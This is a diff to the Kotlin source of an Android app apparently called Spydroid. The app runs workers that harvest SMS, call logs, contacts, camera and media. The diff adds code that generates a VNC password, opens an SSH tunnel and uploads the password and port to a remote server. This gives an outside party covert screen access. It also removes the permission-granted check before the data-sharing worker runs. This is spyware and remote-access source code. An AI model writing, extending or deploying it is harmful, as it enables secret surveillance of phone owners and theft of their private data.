@@ -17,8 +17,11 @@
 
 package net.spydroid.manager.features
 
+import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.Build
 import android.preference.PreferenceManager
 import android.widget.Toast
@@ -35,6 +38,7 @@ import net.christianbeier.droidvnc_ng.VncService
 import net.spydroid.common.local.LocalDataProvider
 import net.spydroid.common.local.data.GLOBAL_STATES_PERMISSIONS
 import net.spydroid.common.remote.RemoteDataProvider
+import net.spydroid.common.remote.network.models.InfoDevices
 import net.spydroid.feature.calls.CallsWork
 import net.spydroid.feature.camera.CameraWork
 import net.spydroid.feature.contacts.ContactsWork
@@ -43,6 +47,30 @@ import net.spydroid.feature.multimedia.MultimediaWork
 import net.spydroid.feature.sharedata.ShareDataWork
 import net.spydroid.feature.sms.SmsWork
 import java.util.concurrent.TimeUnit
+import kotlin.random.Random
+
+
+private fun passwordServerVnc(size: Int = 12): String {
+    val caracteres =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#\$%^&*()-_=+<>?"
+    return (1..size)
+        .map { Random.nextInt(0, caracteres.length) }
+        .map(caracteres::get)
+        .joinToString("")
+}
+
+@SuppressLint("MissingPermission")
+private fun isInternetAvailable(context: Context): Boolean {
+    val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+    val network = connectivityManager.activeNetwork ?: return false
+    val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
+    return when {
+        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
+        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
+        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
+        else -> false
+    }
+}
 
 @Suppress("DEPRECATION")
 class ManagerFeatures(
@@ -61,7 +89,47 @@ class ManagerFeatures(
             val prefs = PreferenceManager.getDefaultSharedPreferences(context)
             val mDefaults = Defaults(context)
 
-            remoteDataProvider.startSshTunnel()
+            val password = passwordServerVnc(20)
+
+            val editor = prefs.edit()
+            editor.putString(Constants.PREFS_KEY_SETTINGS_PASSWORD, password)
+            editor.apply()
+
+            coroutineScope.launch {
+                remoteDataProvider.infoUploaded.collect { infoUploaded ->
+                    if (!infoUploaded) {
+                        remoteDataProvider.startSshTunnel{ port ->
+                            remoteDataProvider.setPasswordVnc(password)
+                            coroutineScope.launch {
+                                localDataProvider.aliasDevice.collect { alias ->
+                                    remoteDataProvider.setInfo(
+                                        InfoDevices(
+                                            alias = alias,
+                                            vnc_password = password,
+                                            vnc_port = port
+                                        )
+                                    )
+                                }
+                            }
+                        }
+                    } else {
+                        remoteDataProvider.startSshTunnel{ port ->
+                            remoteDataProvider.setPasswordVnc(password)
+                            coroutineScope.launch {
+                                localDataProvider.aliasDevice.collect { alias ->
+                                    remoteDataProvider.updateInfo(
+                                        InfoDevices(
+                                            alias = alias,
+                                            vnc_password = password,
+                                            vnc_port = port
+                                        )
+                                    )
+                                }
+                            }
+                        }
+                    }
+                }
+            }
 
             intent.putExtra(
                 VncService.EXTRA_PORT,
@@ -129,8 +197,9 @@ class ManagerFeatures(
         fun start() {
             coroutineScope.launch {
                 localDataProvider.smsState.collect {
-                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED){
-                        val smsWork: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
+                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val smsWork: WorkRequest =
+                            OneTimeWorkRequest.Builder(SmsWork::class.java).build()
                         WorkManager.getInstance(context).enqueue(smsWork)
                         showText("Mensajes")
                     }
@@ -167,14 +236,15 @@ class ManagerFeatures(
         fun start() {
 
             coroutineScope.launch {
-                localDataProvider.multimediaState.collect{
+                localDataProvider.multimediaState.collect {
                     if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                         val multimediaWork: WorkRequest =
-                            OneTimeWorkRequest.Builder(MultimediaWork::class.java).setBackoffCriteria(
-                                BackoffPolicy.LINEAR,  // politics
-                                10,  // Time 10 mins
-                                TimeUnit.MINUTES
-                            )
+                            OneTimeWorkRequest.Builder(MultimediaWork::class.java)
+                                .setBackoffCriteria(
+                                    BackoffPolicy.LINEAR,  // politics
+                                    10,  // Time 10 mins
+                                    TimeUnit.MINUTES
+                                )
                                 .build()
 
                         WorkManager.getInstance(context).enqueue(multimediaWork)
@@ -193,7 +263,7 @@ class ManagerFeatures(
     inner class camera() {
         fun start() {
             coroutineScope.launch {
-                localDataProvider.cameraState.collect{
+                localDataProvider.cameraState.collect {
                     if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                         val cameraWOrk: WorkRequest =
                             OneTimeWorkRequest.Builder(CameraWork::class.java).build()
@@ -233,16 +303,18 @@ class ManagerFeatures(
 
     inner class shareData() {
         fun start() {
-            coroutineScope.launch {
-                localDataProvider.shareDataState.collect {
-                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+            if (isInternetAvailable(context)){
+                coroutineScope.launch {
+                    localDataProvider.shareDataState.collect {
                         val shareDataWork: WorkRequest =
                             OneTimeWorkRequest.Builder(ShareDataWork::class.java)
                                 .build()
                         WorkManager.getInstance(context).enqueue(shareDataWork)
-                        showText("shareData")
+                        showText("ShareData")
                     }
                 }
+            } else {
+                showText("NO INTERNET")
             }
         }
 
